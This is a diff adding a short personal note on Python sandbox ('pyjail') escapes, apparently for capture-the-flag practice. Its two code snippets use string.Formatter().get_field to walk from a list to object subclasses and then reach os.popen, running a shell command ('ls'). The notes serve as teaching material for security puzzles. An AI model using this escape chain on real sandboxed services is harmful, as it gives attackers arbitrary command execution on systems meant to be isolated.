@@ -1,0 +1,17 @@
+* random pyjail notes
+
+idk where this is documented, but string.Formatter().get_field can be used to access object attributes.
+
+@code python
+# returns list of subclasses
+import string
+string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={ "a": [] })()
+@end
+
+You can also nest them, like
+
+@code python
+string.Formatter().get_field("a.__init__.__globals__[popen]", [], kwargs={ 
+    "a": string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={ "a": [] })()[132] # returns os._wrap_close
+})("ls").read()
+@end
